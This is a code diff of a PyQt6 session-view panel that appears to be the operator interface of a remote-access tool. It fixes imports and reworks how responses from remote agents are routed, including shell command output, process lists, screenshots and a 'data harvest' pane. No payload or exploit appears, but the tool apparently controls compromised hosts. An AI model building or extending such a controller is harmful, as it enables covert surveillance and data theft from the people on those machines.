@@ -1,4 +1,4 @@
-# ui/session_view.py (Full Code, Real-Time Update Logic)
+# ui/session_view.py (Corrected Imports)
 import uuid
 from datetime import datetime
 import base64
@@ -7,11 +7,13 @@ from PyQt6.QtWidgets import (QWidget, QVBoxLayout, QHBoxLayout, QPushButton, QLa
                              QTabWidget, QDialog, QScrollArea)
 from PyQt6.QtCore import pyqtSignal, Qt
 from PyQt6.QtGui import QPixmap
-from .discord_pane import DiscordPane
-from .terminal_pane import TerminalPane
-from .live_actions_pane import LiveActionsPane
-from .events_pane import EventsPane
-from .data_harvest_pane import DataHarvestPane
+
+# Corrected: Imports are now absolute from the project root
+from ui.discord_pane import DiscordPane
+from ui.terminal_pane import TerminalPane
+from ui.live_actions_pane import LiveActionsPane
+from ui.events_pane import EventsPane
+from ui.data_harvest_pane import DataHarvestPane
 
 class ScreenshotDialog(QDialog):
     def __init__(self, pixmap, parent=None):
@@ -90,14 +92,14 @@ class SessionView(QWidget):
         self.events_pane.clear_events()
         self.data_harvest_pane.clear_all_views()
         
-        historical_results = self.db.load_results_for_session(session_id)
-        for result in historical_results:
-            self.route_data_packet(result['command_name'], result)
-
+        # Load all vault data for this session
+        for module_name, data_packet in session_data.items():
+            if module_name not in ["metadata", "status"]:
+                self.handle_data_packet(module_name, data_packet)
+        
         user = metadata.get('user', 'N/A')
         hostname = metadata.get('hostname', 'N/A')
-        ip = metadata.get('ip', 'N/A')
-        self.session_info_label.setText(f"<b>{user}@{hostname}</b> ({ip})")
+        self.session_info_label.setText(f"<b>{user}@{hostname}</b> ({session_id})")
         
         self.status_label.setText(status.upper())
         self.status_label.setProperty("status", status.lower())
@@ -106,22 +108,9 @@ class SessionView(QWidget):
         
         self.tabs.setCurrentIndex(0)
 
-    def route_data_packet(self, command, result_data):
-        """ Handles any data packet (live or historical) and routes it to the correct UI pane. """
-        output = result_data.get('output', {})
-        data_str = output.get('data', result_data.get('data')) 
-
-        try:
-            # Data from DB is a string, from live response it might not be.
-            data = json.loads(data_str) if isinstance(data_str, str) else data_str
-        except (json.JSONDecodeError, TypeError):
-            data = data_str
-
-        if command == "Agent Event":
-            self.events_pane.add_event(data)
-        else:
-            # Route all other harvest commands to the data pane
-            self.data_harvest_pane.update_view(command, data)
+    def handle_data_packet(self, command, result_data):
+        output = result_data.get('data', {}) 
+        self.data_harvest_pane.update_view(command, output)
 
     def send_terminal_command(self, command):
         task = {"action": "shell", "params": {"command": command}}
@@ -141,38 +130,32 @@ class SessionView(QWidget):
             self.task_requested.emit(self.current_session_id, task_data)
 
     def handle_command_response(self, session_id, response_data):
-        if session_id != self.current_session_id:
-            return
+        if session_id != self.current_session_id: return
             
         response_id = response_data.get('response_id')
         original_task = self.response_map.pop(response_id, None)
         
-        command = response_data.get("command")
-        output = response_data.get("output", {})
-        data = output.get("data", '[No data received]')
-        status = output.get('status')
-        
+        if not original_task: return
+
+        result = response_data.get('result', {})
+        data = result.get('data', '[No data received]')
+        status = result.get('status')
+        action = original_task.get('action', 'unknown')
+
         if status == 'error':
-            self.events_pane.add_event(f"[{datetime.now():%H:%M:%S}] [ERROR] Action '{command}' failed: {data}")
+            self.events_pane.add_event(f"[{datetime.now():%H:%M:%S}] [ERROR] Action '{action}' failed: {data}")
             return
-
-        if original_task:
-            action = original_task.get('action', 'unknown')
-            if action == "shell":
-                self.terminal_pane.append_output(f"{data}\n")
-            elif action == "pslist":
-                self.liveactions_pane.display_result(f"--- Process List @ {datetime.now():%Y-%m-%d %H:%M:%S} ---\n{data}\n")
-            elif action == "screenshot":
-                try:
-                    img_data = base64.b64decode(data)
-                    pixmap = QPixmap(); pixmap.loadFromData(img_data)
-                    dialog = ScreenshotDialog(pixmap, self); dialog.exec()
-                except Exception as e:
-                    self.events_pane.add_event(f"[{datetime.now():%H:%M:%S}] [ERROR] Could not display screenshot: {e}")
-        else:
-            self.route_data_packet(command, response_data)
-
-    def handle_agent_event(self, session_id, result_data):
-        if session_id == self.current_session_id:
-            data = result_data.get('data', '[No data]')
-            self.events_pane.add_event(data)
+        
+        if action == "shell":
+            self.terminal_pane.append_output(f"{data}\n")
+        elif action == "pslist":
+            self.liveactions_pane.display_result(f"--- Process List @ {datetime.now():%Y-%m-%d %H:%M:%S} ---\n{data}\n")
+        elif action == "screenshot":
+            try:
+                img_data = base64.b64decode(data)
+                pixmap = QPixmap()
+                pixmap.loadFromData(img_data)
+                dialog = ScreenshotDialog(pixmap, self)
+                dialog.exec()
+            except Exception as e:
+                self.events_pane.add_event(f"[{datetime.now():%H:%M:%S}] [ERROR] Could not display screenshot: {e}")
